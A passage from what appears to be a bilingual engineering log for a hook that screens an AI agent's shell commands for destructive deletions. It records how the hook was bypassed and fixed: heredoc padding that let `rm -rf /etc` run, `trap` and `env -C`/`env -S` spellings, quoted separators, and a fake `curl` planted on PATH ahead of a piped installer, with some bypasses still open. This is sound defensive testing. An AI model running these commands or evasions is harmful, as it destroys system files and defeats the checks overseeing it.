`" ; rm -rf /etc` the tokenizer spent exactly its 64 failed reads (its budget was
already working) while `commandSubstitutions()` failed **8,192 times and scanned
33.7 M characters** -- the whole cost was there. The unquoted twin spends 8,192 in
each of two sites, which is why it cost exactly twice as much.
**The fix** extends the same failed-read budget to the three remaining sites: the
tokenizer's TOP-LEVEL `$(` arm (sharing the counter with the in-quote arm that
already had one) and `commandSubstitutions()`'s `$(` and `<(`/`>(` readers (a counter
of its own, because that function re-reads the RAW text after tokenizing, where the
tokenizer's per-call counter cannot reach). **No input-size cap was added**: the
owner's 2026-09-05 ruling was to make the scan linear first and revisit a cap only
if that proved impossible.
Measured through the real stdin entry point (arm64 = this Mac's node 26.8.1;
x86_64 = node 22.17.0, the architecture CI runs): in-quote 382/1,428/5,678 ms before
-> 48/60/83/130 ms after at 16/32/64/128 KB on arm64, and 758/2,624/9,103/38,557 ms
before -> 159/177/215/306 ms after on x86_64; the unquoted twin 820/2,870/11,458 ms
-> 56/74/113/173 ms on arm64 and 1,409/4,788/15,818/80,591 ms -> 205/235/276/407 ms
on x86_64. Every cell DENIES, and the refusal names the protected directory rather
than being the out-of-time one -- the second would mean the gate stopped reading
instead of reading to the end. The `<(` sibling was quadratic on its own (785 ms at
16 KB, 2,965 ms at 32 KB on arm64) and shares the counter.
**What pins it is a COUNT, not a millisecond**: `shellWords()` and
`commandSubstitutions()` each expose `failedSubstitutionReads` on their return value,
and the rows assert that the counter stops exactly AT the cap and that doubling the
input buys no extra failed read. A wall-clock assertion on this path measures the
host (the R4-5 lesson).
**The cost, stated rather than hidden**: past the cap a `$(` that WOULD have closed
is no longer read, so its body is not scanned.

> **This paragraph used to say something false, and the falsehood was load-bearing
> (R5-13, fixed 2026-09-05).** It read: "Reaching that state needs 64 openers that
> never balance anywhere in the rest of the input, which is a syntax error in every
> shell this file models (`bash -n` refuses it), so a command that reaches the cap
> is not a command that runs." **The counter-example is inside the same function**:
> an UNQUOTED heredoc body is deliberately kept in `scannable`, because the
> substitutions in it really do expand -- so that text is code to this gate and
> ordinary DATA to bash. 64 x `$(` in a heredoc body is not a syntax error at all:
> `bash -n` accepts it, and at run time bash prints a NON-fatal
> `bad substitution: no closing )` and carries on to the next line. Measured by
> r5-validate-better-rm-7 against a real target under bash 5.3.15, /bin/bash 3.2.57
> and /bin/sh: `cat <<EOF` + 64 x `$(` + `EOF` + `echo $(rm -rf /etc)` was **ALLOWED
> and really removed it**; 63 openers denied, 64 allowed. Six spellings behaved
> identically (the `<(` twin, `<<-`, `cat <<EOF | wc -l`, a mixed 40+40, and a
> plausible `cat > notes.txt <<EOF` note).
>
> **The general rule, written down so it is not forgotten again**: any bash-LITERAL
> context this gate still scans is scannable text for the gate and inert text for
> the shell, so "the padding would be a syntax error" is never an argument for a
> state being unreachable in this file.

**What happens now (R5-13)**: when any failed-read budget is exhausted, the whole
invocation is REFUSED, with its own sentinel (`SUBSTITUTION_BUDGET_EXHAUSTED`) and
its own rule name (`substitution budget exhausted`) -- the same discipline
`UNREADABLE_TRAP_ACTION` and `UNJUDGEABLE_ENV_S` follow -- and the message carries
the number of openers it could not read. The budget still only skips the READ, so
the cost ceiling and the timing table above are unchanged; what changed is that
"skipped the read" no longer also means "answered as if it had read it".

**The new cost, stated just as plainly**: a command that really does carry 64
unreadable openers and hides no deletion is now refused as well -- the gate cannot
tell the two apart, which is the whole point. The bound on that price is pinned in
the tests: ten unreadable openers in the same shape are still allowed, and anything
a person writes by hand is on the allowed side of that line. One more consequence,
measured over a 4,378-row corpus: 106 rows that used to be refused by name
("protected directory: /etc") are now refused as `substitution budget exhausted`
instead (all deny -> deny, none allow), because the padding really does hide the
path from the scan; a protected path found BEFORE the budget ran out still wins the
message.
**Two things recorded here earlier that still stand**: (a) the `noCloserBeyond` memo
a review suggested is UNSOUND, disproved against this file's own `readBraced`
(`${${}`: index 1 returns null, index 3 returns 4, so a LATER opener can close where
an earlier one cannot) -- do not implement it; and (b) if an input-size cap is ever
wanted, the pre-fix worst-shape numbers were 16 KB -> 746 ms, 32 KB -> 2,883 ms,
64 KB -> 12,363 ms plus up to 2,000 ms of judging -- but with the scan linear there
is no reason to take that route.

## R5-b — 產生器標籤取自 `path.basename()`，只有豁免那一支被收窄

2026-09-04 起，`curl`／`wget` 的安裝路徑豁免要求產生器是「前面什麼都沒有、而且不帶路徑」的
赤裸命令字（見 README「允許的 piped installer 清單」一節；2026-09-05 起那些收窄條件仍在
程式碼與測試裡，但在整行比對之下已經到不了）。**這個收窄只套用在豁免那一支**：
檔案裡其他地方（外殼拆解、carrier 判定）照舊用 `path.basename()` 比對名字，而在那些地方
「名字對了就當成 shell」是 **fail-closed** 的方向——多認一個名字只會多一次拒絕，不會多一次
放行——所以刻意不動。

**R5-b — the producer label still comes from `path.basename()` everywhere except
the exemption.** Since 2026-09-04 the curl/wget install-route exemption requires a
BARE, unprefixed, unpathed producer word (see README's 「允許的 piped installer 清單」
section; since 2026-09-05 that narrowing is unreachable behind the whole-line rule, and
kept as defence in depth). It is deliberately confined to
the exemption: elsewhere in the file (wrapper unwrapping, carrier detection) a
basename match is the FAIL-CLOSED direction -- recognising one more name costs a
refusal, never an allowance -- so it is left as it is.

## R5-c — `trap` 字串裡的命令不會被掃描 — 2026-09-05 **CLOSED**，留作紀錄

`trap 'rm -rf /etc' EXIT` 曾經 **放行**，而且真的會在 shell 結束時執行。原因是 `trap` 的第一個
引數在斷詞後是**一個字**，`rm` 從來不在命令位置上，而這個檔案裡沒有任何一支把「某些命令的某個
引數其實是 shell 程式碼」當成掃描來源。

**修法**：`trap` 有了自己的分支（`commandTargetsScan`，就在 `eval` 旁邊）。動作字串交給
`nestedScan`，也就是 `bash -c '…'` 走的同一條路，所以規則只有一份，裡面每一條規則都照樣適用。
選項字（`-l`／`-p`／`--`）跳過，`-`（重設）與空字串（忽略）不是動作，其餘第一個操作元就是動作。
動作的文字若要展開後才知道（`trap "$CMD" EXIT`），走新的 `UNREADABLE_TRAP_ACTION` sentinel
fail closed；`$HOME`／`$PWD`／`$TMPDIR` 用的是 rm 操作元同一個 `resolveKnownExpansions`，所以
`trap 'rm -rf "$TMPDIR/x"' EXIT` 這種真正的清理 trap 讀得出來、照一般規則放行。

**實測（touch marker，不是推論；2026-09-05）**：動作真的會執行的拼法是 EXIT、ERR、DEBUG、
具名訊號（SIGUSR1）、數字 `0`、小寫 `exit`、一次多個訊號、`--` 之後、以及
`builtin trap`／`command trap`／`\trap`——在 /opt/homebrew/bin/bash 5.3.15、/bin/bash 3.2.57、
/bin/sh、/bin/zsh、/bin/dash、/bin/ksh 上都一樣。**不會執行**的三種也量了，而且照樣拒絕：
`trap -p '<動作>' EXIT`（列印模式，bash 不收那個訊號名）、`trap '<動作>'`（沒有訊號名，四種
shell 都不安裝）、`trap touch <路徑> EXIT`（動作被拆成多個字，bash／zsh／dash／ksh 都報錯）。
最後一種在新規則下只會掃到 `touch`，不是刪除，所以它本來就不會被擋；前兩種是**刻意多擋**：
「跳過選項字、讀下一個操作元」是一條規則，再補一條「列印模式就不要看」只會把一個沒人會寫的
形狀從拒絕改成放行。

**這一族其餘的成員仍然各自為政，別把這一條讀成「引數即程式碼」已經整族解決**：`eval`、
`sh -c`／`bash -c`／`zsh -c`（本來就被別的規則掃到）、`xargs … sh -c`（同日一併修，見 R4-b）、
`awk`／`perl`／`python -c`、`find -exec sh -c`、`ssh <host> '<cmd>'`、`watch`、
`timeout … sh -c`、`systemd-run` —— 這些沒有量、也沒有修。

**R5-c — a command inside a `trap` string is never scanned — CLOSED 2026-09-05,
kept as the record.** `trap 'rm -rf /etc' EXIT` used to be **ALLOW** and really did
run at shell exit: `trap`'s first argument tokenizes to a single WORD, so `rm` was
never in command position, and nothing in this file treated "this command's argument
is shell code" as a scan source.
**The fix**: `trap` has a branch of its own in `commandTargetsScan`, beside `eval`,
and the action string is handed to `nestedScan` -- the same route `bash -c '…'`
takes -- so there is ONE copy of every rule and all of them apply inside the action.
Option words (`-l`, `-p`, `--`) are skipped; `-` (reset) and the empty string
(ignore) are not actions; the first remaining operand is. An action whose TEXT only
exists after expansion (`trap "$CMD" EXIT`) fails closed through a new
`UNREADABLE_TRAP_ACTION` sentinel with a message of its own, while $HOME/$PWD/$TMPDIR
go through the same `resolveKnownExpansions` an rm operand does -- so the cleanup
trap people actually write, `trap 'rm -rf "$TMPDIR/x"' EXIT`, is read and allowed.
**Measured with touch markers, not reasoned about (2026-09-05)**: the action really
executes for EXIT, ERR, DEBUG, a named signal (SIGUSR1), the numeric `0`, the
lowercase `exit`, several signals at once, after `--`, and through `builtin trap`,
`command trap` and `\trap` -- under bash 5.3.15, bash 3.2.57, sh, zsh, dash and ksh
alike. Three spellings measured NOT to execute are refused anyway, and the reason is
recorded rather than hidden: `trap -p '<action>' EXIT` (print mode; bash rejects that
sigspec), `trap '<action>'` with no sigspec (no shell of the four installs it), and
`trap touch <path> EXIT` (the action split across words; bash, zsh, dash and ksh all
error). The last one is not refused by the new rule at all -- it scans the word
`touch`, which deletes nothing -- and the first two are a deliberate over-refusal:
"skip the option word and read the next operand" is one rule, and "…except in print
mode, where you should not look" would be a second one whose only effect is to turn
a refusal into an allowance for a command nobody writes.
**The rest of the family is still on its own, so do not read this as "an argument is
code" being handled**: `eval`, `sh -c`/`bash -c`/`zsh -c` (already reached by other
rules), `xargs … sh -c` (fixed the same day, see R4-b), `awk`/`perl`/`python -c`,
`find -exec sh -c`, `ssh host '<cmd>'`, `watch`, `timeout … sh -c` and `systemd-run`
are neither measured nor fixed.


## R5-d — 產生器名字被「行外」換掉：PATH 上先種一個 `curl`，或上一次呼叫留下的 `hash -p`

2026-09-05 起，豁免的條件是**整條命令列逐位元組等於 `CANONICAL_INSTALL_LINES` 上的一行**，
而且必須是使用者自己打的那一行（`depth === 0`）。因此「這一行看得到」的每一種替換都不再是
問題：`curl(){ … }`、`eval 'curl(){ … }'`、`e''val 'c''url(){ … }'`、`source <(…)`、
`. <(…)`、here-doc、`trap`、`hash -p …`、`export PATH=…; <豁免路徑>`、
`BASH_ENV=<檔> bash -c '<豁免路徑>'`、`FPATH=<目錄> zsh -c 'autoload -Uz curl; <豁免路徑>'`、
`enable -f <物件> curl; <豁免路徑>`——每一種都在行上多了字元，所以那一行就不是清單上的行了。
（前四種在 2026-09-04 的版本上實測會執行；中間三種是 2026-09-05 補測的 NOTE-B，同樣會執行。）

**看不到、也擋不住的，是「上一次呼叫」留下的東西**：`~/bin/curl`（或 PATH 上任何一個排在
`/usr/bin` 前面的目錄）先被種進一個可執行檔，然後才送出一條乾淨的
`curl -sSL <豁免網址> | bash`；或者在**前一次** Bash 呼叫裡跑過
`hash -p /tmp/evil/curl curl`、`export BASH_ENV=<檔>`、`export FPATH=<目錄>`，而這一次的
命令列上什麼都沒寫。這些實測都會執行被種下去的那支程式，而這一行的文字與 README 記載的安裝
路徑逐位元組相同。

**這是文字閘門的定義域邊界，不是缺陷可以修掉的東西**：PreToolUse 只拿得到即將執行的那一行
文字，拿不到 PATH 的內容、也拿不到上一個 shell 行程的 hash table（那個 shell 行程甚至還沒
存在）。要涵蓋它得在執行時解析 `curl` 會落到哪個檔案，那是另一種閘門。寫在這裡，是為了不
讓條件 5 讀起來像是「產生器一定是真正的 curl」的保證——它保證的只是「這一行沒有把它換掉」。

**R5-d — the producer's name replaced from OFF the line: a `curl` planted on PATH, or a
`hash -p` or a `BASH_ENV` left behind by an earlier call.** Since 2026-09-05 the exemption
requires the WHOLE command line to be byte-equal to a line in `CANONICAL_INSTALL_LINES` and
to be the line the user typed (`depth === 0`), so every ON-LINE replacement stopped
mattering: `curl(){ … }`, `eval 'curl(){ … }'`, `e''val 'c''url(){ … }'`, `source <(…)`,
`. <(…)`, a here-doc, `trap`, `hash -p`, `export PATH=…; <route>`,
`BASH_ENV=<file> bash -c '<route>'`, `FPATH=<dir> zsh -c 'autoload -Uz curl; <route>'` and
`enable -f <obj> curl; <route>` each add characters to the line, so the line is no longer
that line. (The first four were measured executing against the 2026-09-04 build; the three
environment plants are NOTE-B, measured 2026-09-05, and execute too.) What it cannot
see is what an EARLIER call left behind: an executable planted at `~/bin/curl` (or anywhere
on PATH ahead of `/usr/bin`) before an otherwise clean `curl -sSL <exempted URL> | bash`, or
a `hash -p /tmp/evil/curl curl`, `export BASH_ENV=<file>` or `export FPATH=<dir>` run in an
EARLIER Bash call with nothing on this line to show for it. Both really run the
planted program while this line's text matches the documented install route byte for byte.
This is the domain boundary of a text gate, not a defect to fix: PreToolUse is handed the
line that is about to run and nothing else -- not the contents of PATH, not the hash table
of a shell process that does not exist yet. Written down so condition 5 is not read as a
promise that the producer IS the real curl; it promises only that this line did not replace it.

## R5-8 家族（同一行把產生器換掉）— 2026-09-05 **由構造上關閉**，留作紀錄

這一條不是殘留，是**已關閉項目的紀錄**，放在這裡是因為它前後改過三次，而每一次都留下一份
「已經修好了」的說明。

R5-8 指的是「一條命令列在豁免的 `curl`／`wget` 之前，先把那個名字換成別的東西」。三輪都用
同一種方法處理它——**列舉**：先是斷詞看得到的定義（`curl(){ … }`、`function curl`、
`alias curl=`、`hash -p`），再是原始文字裡的 `eval`／`source`／點命令／`trap`／`exec`。
每一輪都關掉了自己列舉的那些，然後被下一種沒被列舉到的寫法打穿；最後一次是
**字裡面的引號消去**（`e''val 'c''url() { … }'`）：原始位元組裡兩個關鍵字都不存在，斷詞後
那個定義又是一個字，兩種掃法都看不到，而 shell 會把兩者還原。

**2026-09-05 改成整行字面比對之後，這一類不再需要列舉**：豁免只在「整條命令列逐位元組等於
`CANONICAL_INSTALL_LINES` 上的一行、而且是使用者自己打的那一行」時成立，所以任何替換都必須
在行上多寫字元，而多寫的每一個字元都會讓這一行不再是清單上的行。**代價**列在 README 的
「允許的 piped installer 清單」一節與 `test-hooks.js` 的 `wholeLineRuleCosts`：十七條原本
放行的寫法從此拒絕。**還沒關掉的是「行外」那一半**，見上面的 R5-d。

**R5-8 family (replacing the producer from the same line) — CLOSED BY CONSTRUCTION on
2026-09-05, kept as a record.** Not a residual: a record, kept because this rule was
rewritten three times and each round left behind a paragraph saying it was fixed. R5-8 is
"a command line replaces the exempted `curl`/`wget` name before it runs". Three rounds
attacked it by ENUMERATION -- first the definitions word-splitting can see, then
`eval`/`source`/dot/`trap`/`exec` in the raw text -- and each round closed what it had
listed and was defeated by a spelling nobody had listed, last by in-word quote removal
(`e''val 'c''url() { … }'`), which is invisible to both scans and rebuilt by the shell.
Since the exemption became a whole-line literal match on the line the user typed, the class
needs no enumeration: any replacement must add characters, and any added character stops
the line from being the listed line. The cost is listed in README's 「允許的 piped
installer 清單」 section and in `wholeLineRuleCosts`. The OFF-line half is still open: R5-d.

## R5-e — env(1) 的 `-C` / `--chdir` 換掉工作目錄，判定卻仍對著呼叫端的 cwd（**OPEN，僅記錄**）

與 README「同樣要說清楚**沒有**涵蓋的部分」那一段講的 `cd <dir> && rm -rf <相對路徑>` 是
**同一個性質**，只是換一個到達方式：env(1) 自己就能換工作目錄。

- BSD env（macOS，本機 usage 行即為 `env [-0iv] [-C workdir] [-P utilpath] [-S string]
  [-u name] ...`）：`env -C / rm -rf etc`
- GNU coreutils env（ubuntu runner 與所有 Linux 使用者）：`env --chdir=/ rm -rf etc`

`hooks/protect-important-paths.js` 把 `-C` / `--chdir` 放在 `optionsWithValue` 裡，走訪會把
選項連同它的值一起跳過，但沒有任何地方把那次 chdir 接進判定，於是相對操作元仍然是對著本次
工具呼叫的 cwd 解讀的。2026-09-05 用 mkdir marker 實測：兩種拼法都真的在目標目錄裡建出了
檔案（BSD env 不認 `--chdir=`，GNU env 兩種都認）。

**為什麼只記錄、不修**：這道閘門從頭到尾都不模擬 `cd`——hook 自己的註解就寫著「沒有任何地方
把 `cd` 串進去」（`unknownDenial` 上方那段）。單獨替 env 的 `-C` 建一套 cwd 模型，會做出一個
只對 env 這一條路徑成立、對 `cd` 這條更常見的路徑不成立的判定，也就是把同一個性質分岔成兩種
行為。要修就要整道閘門一起有 cwd 模型，那是另一個題目、另一次裁決。

**沒有被打穿的部分**：絕對路徑的操作元照舊被判定（`env -C /tmp rm -rf /etc` 是拒絕），以
「名字」認定的項目也照舊（`env -C / rm -rf .git` 是拒絕，因為 `.git` 比對的是路徑元件而不是
解析後的絕對路徑）。被漏掉的只有「相對操作元 + 換過的工作目錄」這一個組合。

**R5-e — env(1)'s `-C` / `--chdir` changes the working directory while the verdict is still
taken against the caller's cwd (OPEN, recorded only).** The same property as the
`cd <dir> && rm -rf <relative>` limitation README already documents, reached through env(1)
instead of `cd`: `env -C / rm -rf etc` on BSD env (macOS, whose own usage line lists
`[-C workdir]`) and `env --chdir=/ rm -rf etc` on GNU coreutils env (the ubuntu runner's and
every Linux user's). Both were measured executing inside the chdir target on 2026-09-05 with
mkdir markers; BSD env does not accept the `--chdir=` spelling. The walk puts `-C`/`--chdir`
in `optionsWithValue` and skips the option with its value without modelling the chdir, so a
relative operand is resolved against the tool call's cwd. NOT FIXED deliberately: this gate
models no `cd` at all -- the hook's own comment above `unknownDenial` says nothing threads a
`cd` through it -- so building a cwd model for env's `-C` alone would fork one property into
two behaviours, strict on the env spelling and silent on the far commoner `cd` one. A cwd
model belongs to the whole gate and is a separate decision. Not reached: absolute operands
are still judged (`env -C /tmp rm -rf /etc` is refused) and name-matched entries still are
too (`env -C / rm -rf .git` is refused, because `.git` is matched as a path component and not
as a resolved absolute path). Only "relative operand plus a changed working directory" is.

## R5-f — 加了引號、長得像分隔符的操作元會截斷 rm 的操作元掃描 — 2026-09-05 **CLOSED**，留作紀錄

`rm -rf ';' /etc` 掃不出任何目標，因此被放行；`rm ';' -rf /etc` 同樣。`;`、`\;`、`';'` 斷詞
後是同一個單字元字，而 rm 的操作元掃描（`hooks/protect-important-paths.js` 兩處
`for (; i < words.length && !separators.has(words[i]); i += 1)`）與外層的包裝走訪問的都是
`separators` 本身，不看「這個字是不是寫成未加引號的運算子」——那個旗標（`operatorTokens`）
存在，但目前只有 find 那一支在用，而它的註解正是為了這個分別而寫的。

真正會發生的事：`;` 只是 rm 的另一個操作元，rm 會試著刪掉名為 `;` 的檔案**以及** `/etc`。

**與 env 無關**：完全不用 env 也到得了（上面兩條就是），所以這不是 `env -S` 那條路徑的性質，
而是整道閘門共用的一條規則的性質。r5-fix-better-rm-5 在新增 `envArgvAfter()` 時刻意跟著這條
共用規則走，而不是只在那一個新站點改讀 `operatorTokens`：實測那樣改，47 列 env 探針與 886 列
語料都沒有任何一列改變（因為操作元掃描下一步就會在同一個字上截斷），等於分岔了慣例卻沒關掉
任何東西。要修就要把 `separators` 與 `operatorTokens` 的分工在整道閘門一次講清楚。

**R5-f — a quoted separator-shaped operand truncates the rm operand scan — CLOSED
2026-09-05, kept as a record.** `rm -rf ';' /etc` yields no targets and is allowed; so does `rm ';' -rf /etc`. `;`,
`\;` and `';'` tokenize to the same one-character word, and both rm operand scans (the two
`for (; i < words.length && !separators.has(words[i]); i += 1)` loops) and the wrapper walks
ask `separators` alone, without consulting whether the word was WRITTEN as an unquoted
operator -- the `operatorTokens` flag exists for exactly that distinction but only the find
branch reads it. What really happens: `;` is just another operand, and rm tries to remove a
file named `;` AND `/etc`. Reachable with no env(1) involved, so it is a property of a rule
the whole gate shares, not of the `env -S` path. r5-fix-better-rm-5 deliberately followed the
shared rule in its new `envArgvAfter()` rather than reading `operatorTokens` at that one new
site: measured, that change moves no row of the 47-row env probe and no row of the 886-row
corpus, because the operand scan truncates on the same word a moment later -- it would fork
the convention without closing anything. Fixing it means settling the division of labour
between `separators` and `operatorTokens` across the whole gate at once.

**2026-09-05 已修（r5-fix-better-rm-6）**：分工寫成一個地方——`operatorAt(index, set)`，就在
`operatorTokens` 取進作用域的下一行——並由 12 個「把一個字判成運算子」的站點共同讀它：rm／
rmdir／無法解析命令字的操作元掃描與它的 redirector 臂、find 的搜尋根掃描、三處「跳到命令結
尾」的臂、carrier 走訪、包裝走訪、以及 `envArgvAfter`。實測 931 列語料在修前修後判定與拒絕
文字逐位元組相同。

**Closed 2026-09-05 (r5-fix-better-rm-6)**: the division of labour is written down in one
place — `operatorAt(index, set)`, on the line after `operatorTokens` comes into scope — and
read by the 12 sites that classify a word as an operator. Measured: 931 corpus rows keep
byte-identical verdicts and refusal text.

## R5-10b — env(1) 的 `-S` 字串曾用 shell 的規則切開 — 2026-09-05 **CLOSED**，留作紀錄

`env -S 'rm\_-rf' /etc` 與 `env -S 'rm # x' -rf /etc` 都真的會跑 `rm -rf /etc`（2026-09-05 用
marker 目錄在 macOS BSD env 與 GNU coreutils 9.11 env 上實測，兩邊一致），而重組把原始 `-S`
字串原封不動接回一條命令列、交給 **shell** 的斷詞器重切，於是 `rm\_-rf` 變回單一個字
`rm_-rf`（不是命令），`rm # x` 則在 `#` 上把重組截斷、丟掉它本來要接上去的那些操作元。

現在改成先用 env 自己的規則切（`\_` 會切開、字首 `#` 是註解、引號成組、`\c` 提早結束、
`\f\n\r\t\v` 與 `\\ \# \$ \' \"` 是字面），再把每個字用既有的 `envArgvWordLiteral` 重新加引號，
與 `-S` 後面那些字走同一條路。五種 `-S` 拼法共用同一個 helper，所以一處改動全部覆蓋。

**Closed 2026-09-05 (r5-fix-better-rm-6).** The `-S` string is now split by env(1)'s own
rules and each word re-quoted with the existing `envArgvWordLiteral`, i.e. treated exactly
the way the words after `-S` already are. All five `-S` spellings share the one helper.

## R5-g — 這一輪刻意留下的三件事（**OPEN，僅記錄**）

**(1) find `-exec` 子句的終止符沒有接上 `operatorAt`。** 只有 `;` 與 `+` 會終止 `-exec` 子句
（POSIX），所以跳脫或加引號的 `|`、`&`、`(` 真的會結束 find 對子句的讀取——實測 BSD find 回
`-exec: no terminating ";" or "+"`、exit 1、什麼都沒刪。把這一處接上會把 `test-hooks.js` 裡
`find /etc -exec cat {} '|' -delete` 那三列變成誤擋。r5-better-rm-f 的修復計畫要求「為了一致
性」連這裡一起改，這裡刻意不照做，理由如上。連帶：
`find . -name x -exec rm -rf ';' /etc \;` 仍然 ALLOW，而實測它什麼都不刪（find 把那個加引號
的 `;` 當成自己的 `-exec` 終止符）。

**(2) `controlWords` 那四個站點沒有接上 `operatorAt`。** `rm -rf '{' /etc`、`rm -rf '}' /etc`
本來就是 DENY，接上它是另一個問題、要另一組對照，不在這一輪。

**(3) 巢狀掃描的去重只認得「重複」的文字。** 記住的是「同一段文字在同一個 depth 掃過了」，所
以 `env -S` 那種每層文字都相同的巢狀從 87,381 次掃描收斂成 17 次；但一段每層子文字都不同的巢
狀仍然是每層 4 倍，上限是 depth 8（4^8）。實測目前沒有這種形狀：八層的良性列現在是 2 個目
標、0.3 ms，而十萬字元、八層、包著 `rm -rf /etc` 的攻擊者版本在修前 120 秒內沒有任何答案、修
後約 55 ms（suite 內；獨立行程約 90 ms）拒絕。真要封死就要「總掃描次數上限 + fail closed」，那是另一個決定。

**R5-g — three things this round deliberately left (OPEN, recorded only).**
**(1)** The find `-exec` clause terminator is NOT gated on `operatorAt`: only `;` and `+`
terminate an `-exec` clause (POSIX), so an escaped or quoted `|`, `&` or `(` really does end
find's read — measured, BSD find answers `-exec: no terminating ";" or "+"`, exits 1 and
removes nothing, and gating it turned the three `find /etc -exec cat {} '|' -delete` rows
into refusals of a command that deletes nothing. The r5-better-rm-f fix plan asked for this
site "for consistency"; it is deliberately not followed. Consequence:
`find . -name x -exec rm -rf ';' /etc \;` stays ALLOW, and measured it removes nothing.
**(2)** The four `controlWords` sites are not gated: `rm -rf '{' /etc` and `rm -rf '}' /etc`
are already DENY, and gating them is a separate question with its own controls.
**(3)** The nested-scan dedup recognises REPEATED text only. A nesting whose sub-texts are
all distinct is still 4x per level, bounded by the depth-8 cap (4^8). No such shape is known
today: the eight-level benign row is 2 targets and 0.3 ms, and a 100 KB eight-level attacker
version around `rm -rf /etc` went from no answer within 120 s to a refusal in about 55 ms in-suite (≈90 ms as a fresh process). Closing
that would need a total-nested-scan cap that fails closed — a separate decision.

## R5-h — `env -S` 的失敗即關閉會誤擋三種寫法（**OPEN，僅記錄，代價已知**）

為了不猜，`-S` 字串出現下列任一情形就拒絕，即使它其實無害：含 `$`（會展開，值要到執行時才知
道）、含沒有建模的反斜線跳脫（含**單引號裡的任何反斜線**——實測兩種實作在單引號裡會處理
`\\` 卻不處理 `\_`，同一組引號裡兩種答案，不是這道閘門扛得住的規則）、雙引號裡的 `\c`（沒有
實測過）、以及引號沒有收掉。已知代價：`env -S 'rm\ -rf' /etc` 從 ALLOW 變成 DENY（實測它兩種
實作都跑不起來，所以只是誤擋，不是漏擋）。

**R5-h — the `env -S` fail-closed over-refuses three spellings (OPEN, recorded, cost known).**
An `-S` string containing a `$`, a backslash escape this gate does not model (including ANY
backslash inside single quotes — measured, both implementations process `\\` there but not
`\_`), a `\c` inside double quotes, or an unclosed quote is refused even when it is harmless.
Known cost: `env -S 'rm\ -rf' /etc` moved from ALLOW to DENY; measured, that spelling runs on
neither implementation, so this is an over-refusal, not a missed one.
